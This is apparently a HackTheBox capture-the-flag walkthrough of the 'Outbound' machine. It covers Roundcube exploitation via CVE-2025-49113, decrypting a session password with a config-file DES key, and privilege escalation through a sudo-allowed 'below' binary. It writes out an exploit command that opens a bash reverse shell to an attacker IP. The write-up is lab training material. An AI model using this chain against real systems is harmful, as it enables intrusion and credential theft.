# OUTBOUND HTB
The IP of this machine was 10.10.11.77
![2](https://hackmd.io/_uploads/BJYIPkgjxg.png)

Then I performed enumeration using nmap tool
![3](https://hackmd.io/_uploads/rydiw1liee.png)
As seen above, it was running two services http and ssh
I loaded the page on a browser and saw it maps to mail.outbound.com so I went to map the DNS address to the domain name on the etc/hosts.
![4](https://hackmd.io/_uploads/SkhYOkloex.png)
Then from the machine's description, I was provided with credentials
![5](https://hackmd.io/_uploads/S136u1xjlx.png)
On logging in
![6](https://hackmd.io/_uploads/Hy7eFJlixg.png)
On the about page I found the version of roundcube that the email was operating on.
![7](https://hackmd.io/_uploads/r1EMY1gigx.png)

I went to do some googling and found it has some vulnerabilities
![8](https://hackmd.io/_uploads/HkwcFygjxg.png)

There is a vulnerability affecting this software version , CVE-2025–49113.
I found a github repo with this juicy stuff.
![9](https://hackmd.io/_uploads/H16zc1loll.png)

I cloned the repo
![10](https://hackmd.io/_uploads/S1yL9yeoeg.png)
Got inside it
![11](https://hackmd.io/_uploads/r1bO5kxieg.png)
exploit command :
`php CVE-2025–49113.php http://mail.outbound.htb <username> <password> "bash -c 'bash -i >& /dev/tcp/<your_ip_address>/4444 0>&1'"`
![12](https://hackmd.io/_uploads/SJP5Hgxoge.png)

Then i set up a listener and got a shell as user www-data after executing the exploiting
![13](https://hackmd.io/_uploads/SJLmLxxjxx.png)

On looking, I spotted a config file in the roundcube directory and found some juicy stuff.
![14](https://hackmd.io/_uploads/r1ns8lloge.png)

Using the mysql credentials, I got in
![15](https://hackmd.io/_uploads/HJhJvgxjeg.png)
In the database, I enumerated users but there were no passwords alongside so i went to enumerate sessions too and got the sessions were in base64.
![16](https://hackmd.io/_uploads/SymiDegigg.png)

Then i headed to cyberchef to try decode this.
![17](https://hackmd.io/_uploads/rkrlOegige.png)
If you recall, in the config.inc.php file, we saw the encrytion key[rcmail-!24ByteDESkey*Str], very helpful in decrypting Jacob's password also using cyberchef.io. After much research i found out that roundcube uses Triple-DES (DES-EDE3-CBC) for its encryption so we head on over to cyberchef.io but before decrypting, we have to decode from base 64 to hex format so as to have a valid input to decode.

![18](https://hackmd.io/_uploads/Hy0Btggsxe.png)
It also requests for an IV, which is 8 bytes and it is the first 8 alphanumeric pair when you convert the password form base 64 down to hex.
![19](https://hackmd.io/_uploads/SybtKxgjgx.png)

After getting jacob's credential i changed user to his account
![20](https://hackmd.io/_uploads/HJx0Fxgogg.png)

Then I went to check into his directory
![21](https://hackmd.io/_uploads/r1xUqlgsgl.png)
Reading into the file found in his directory, i got ssh credentials
![22](https://hackmd.io/_uploads/B1lscxejxe.png)

Then I immediately went to ssh into it to get and managed to get the user flag 
![23](https://hackmd.io/_uploads/BJRusegiee.png)
![24](https://hackmd.io/_uploads/rJuhigxilg.png)

I started a python server from my kali machine as i wanted to transfer linpeas
![25](https://hackmd.io/_uploads/Sypghgxjel.png)

Using wget, I received it
![26](https://hackmd.io/_uploads/HJDXhxxsee.png)

I gave it the necessary permissions and then fired it up
![27](https://hackmd.io/_uploads/r1me6xxjxx.png)

In most times my entry point for privilege escalation is to find the command that can run without the root password (sudo -l)
![28](https://hackmd.io/_uploads/Bkw_6lxsgx.png)

Gotcha! /usr/bin/below , at the time I'm writing this walkthrough there was
a CVE for privilege escalation that came out about a month ago affecting the Below service before version 0.9.0.

![29](https://hackmd.io/_uploads/ryzs0lgoee.png)

I just cloned into it, then started a python server to transfer it to the victim machine
![30](https://hackmd.io/_uploads/ryEE1Wlsxx.png)

Using wget I was able to get it
![31](https://hackmd.io/_uploads/HJw_1Zejll.png)
And simply on running it, works like magic and very fast makes you root
![32](https://hackmd.io/_uploads/SkM0y-xseg.png)
In here i was able to get the root flag 
![33](https://hackmd.io/_uploads/Syg-eWeoge.png)
And that was all for this machine
![34](https://hackmd.io/_uploads/S1qGg-xjgx.png)
